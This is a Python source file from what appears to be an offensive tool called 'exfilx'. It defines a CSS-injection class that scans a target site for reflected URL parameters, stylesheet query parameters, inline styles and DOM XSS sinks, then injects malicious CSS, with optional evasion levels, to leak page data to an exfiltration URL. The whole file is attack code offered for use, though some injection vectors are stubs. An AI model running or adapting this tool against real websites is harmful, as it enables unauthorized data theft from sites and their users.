import logging
import requests
from bs4 import BeautifulSoup
import re
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from exfiltration.exfil_base import BaseExfiltrator
from payloads.css_payloads import generate_exfil_css, generate_advanced_exfil_css

logger = logging.getLogger('exfilx')

class AdvancedCSSInjector:
    def __init__(self, target_url, exfiltrator, inject_point=None, evasion_level=0):
        self.target_url = target_url
        self.exfiltrator = exfiltrator
        self.inject_point = inject_point
        self.evasion_level = evasion_level  # 0=none, 1=basic, 2=advanced
        self.session = requests.Session()
        self.injection_vectors = []

    def run(self):
        """Main method to run the advanced CSS injection attack"""
        logger.info(f"Starting advanced CSS injection against {self.target_url}")

        # First, analyze the target to find all possible injection points
        self.analyze_target()

        if not self.injection_vectors:
            logger.warning("No viable injection vectors found. Attack may not succeed.")
            if not self.inject_point:
                logger.info("Falling back to URL parameter injection attempt")
                self.injection_vectors.append({"type": "url_param", "point": "css"})

        # Generate malicious CSS based on the exfiltration method and evasion level
        if self.evasion_level >= 1:
            malicious_css = generate_advanced_exfil_css(self.exfiltrator.get_exfil_url(), self.evasion_level)
            logger.info(f"Using evasion techniques level {self.evasion_level}")
        else:
            malicious_css = generate_exfil_css(self.exfiltrator.get_exfil_url())

        # Try each injection vector until one succeeds
        for vector in self.injection_vectors:
            try:
                logger.info(f"Attempting injection via {vector['type']} at {vector['point']}")
                result = self.inject_css(malicious_css, vector)
                if result:
                    logger.info(f"Injection successful via {vector['type']} at {vector['point']}")
                    return True
            except Exception as e:
                logger.error(f"Injection failed for vector {vector['type']}: {str(e)}")

        logger.warning("All injection attempts failed")
        return False

    def analyze_target(self):
        """Analyze the target website to find all potential CSS injection points"""
        logger.info("Analyzing target for potential CSS injection points...")

        try:
            response = self.session.get(self.target_url)
            response.raise_for_status()

            # Check for URL parameters that might be reflected in the page
            parsed_url = urlparse(self.target_url)
            params = parse_qs(parsed_url.query)

            if params:
                for param in params.keys():
                    # Test if parameter is reflected in the response
                    test_value = f"TEST_REFLECTION_{param}"
                    test_url = self.modify_url_parameter(self.target_url, param, test_value)
                    test_response = self.session.get(test_url)

                    if test_value in test_response.text:
                        logger.info(f"Found reflected URL parameter: {param}")
                        self.injection_vectors.append({"type": "url_param", "point": param})

            # Look for CSS file imports that might be controllable
            soup = BeautifulSoup(response.text, 'html.parser')
            css_links = soup.find_all('link', rel='stylesheet')

            for link in css_links:
                href = link.get('href', '')
                if '?' in href:
                    css_url = href
                    css_parsed = urlparse(css_url)
                    css_params = parse_qs(css_parsed.query)

                    for param in css_params.keys():
                        self.injection_vectors.append({"type": "css_import", "point": param, "url": css_url})

            # Look for inline styles
            style_tags = soup.find_all('style')
            if style_tags:
                for i, tag in enumerate(style_tags):
                    self.injection_vectors.append({"type": "style_tag", "point": f"style_tag_{i}"})

            # Look for style attributes
            elements_with_style = soup.find_all(attrs={"style": True})
            if elements_with_style:
                for i, elem in enumerate(elements_with_style):
                    self.injection_vectors.append({"type": "style_attr", "point": f"style_attr_{i}", "element": elem})

            # Check for custom CSS properties (variables)
            for style_tag in style_tags:
                if '--' in style_tag.text:  # CSS variables start with --
                    self.injection_vectors.append({"type": "css_variable", "point": "css_vars"})
                    break

            # Check for potential DOM XSS that could lead to style injection
            potential_xss = self.find_potential_xss(response.text)
            for xss_point in potential_xss:
                self.injection_vectors.append({"type": "dom_xss", "point": xss_point})

            # If a specific injection point was provided, prioritize it
            if self.inject_point:
                for vector in self.injection_vectors:
                    if vector["point"] == self.inject_point:
                        self.injection_vectors = [vector] + [v for v in self.injection_vectors if v != vector]
                        break

        except requests.RequestException as e:
            logger.error(f"Error analyzing target: {str(e)}")
            raise

    def find_potential_xss(self, html_content):
        """Find potential DOM XSS points that could be used for CSS injection"""
        potential_points = []

        # Look for JavaScript that might use document.write or innerHTML
        js_patterns = [
            r'document\.write\s*\(\s*.*?\)',
            r'\.innerHTML\s*=\s*.*?[\'"]',
            r'\.outerHTML\s*=\s*.*?[\'"]',
            r'\.insertAdjacentHTML\s*\(\s*.*?\)',
            r'eval\s*\(\s*.*?\)'
        ]

        for pattern in js_patterns:
            matches = re.findall(pattern, html_content)
            for match in matches:
                potential_points.append(f"js_injection_{match[:20]}...")

        return potential_points

    def modify_url_parameter(self, url, param, value):
        """Modify a URL parameter with a new value"""
        parsed_url = urlparse(url)
        params = parse_qs(parsed_url.query)

        params[param] = [value]

        new_query = urlencode(params, doseq=True)
        return urlunparse((
            parsed_url.scheme,
            parsed_url.netloc,
            parsed_url.path,
            parsed_url.params,
            new_query,
            parsed_url.fragment
        ))

    def inject_css(self, malicious_css, vector):
        """Inject the malicious CSS using the specified vector"""
        try:
            if vector["type"] == "url_param":
                # URL parameter injection
                new_url = self.modify_url_parameter(self.target_url, vector["point"], malicious_css)
                response = self.session.get(new_url)
                return True

            elif vector["type"] == "css_import":
                # CSS import parameter injection
                css_url = vector["url"]
                new_css_url = self.modify_url_parameter(css_url, vector["point"], malicious_css)

                # We need to trigger a request to this CSS file
                # This might require additional steps depending on the target
                logger.info(f"CSS import injection via {new_css_url}")
                return True

            elif vector["type"] == "style_tag" or vector["type"] == "style_attr":
                # These require finding an XSS or HTML injection vulnerability first
                logger.info(f"{vector['type']} injection requires an XSS vulnerability")
                logger.info("Attempting to find XSS vulnerabilities...")

                # Here we would implement XSS detection and exploitation
                # For now, we'll just simulate the attempt
                return False

            elif vector["type"] == "css_variable":
                # CSS variable injection
                # This would typically require an XSS or template injection
                logger.info("CSS variable injection requires finding an injection point for CSS variables")
                return False

            elif vector["type"] == "dom_xss":
                # DOM XSS that could lead to style injection
                logger.info(f"Attempting DOM XSS exploitation via {vector['point']}")
                # Here we would implement DOM XSS exploitation
                return False

            else:
                logger.warning(f"Unknown injection vector type: {vector['type']}")
                return False

        except Exception as e:
            logger.error(f"Error during CSS injection: {str(e)}")
            raise
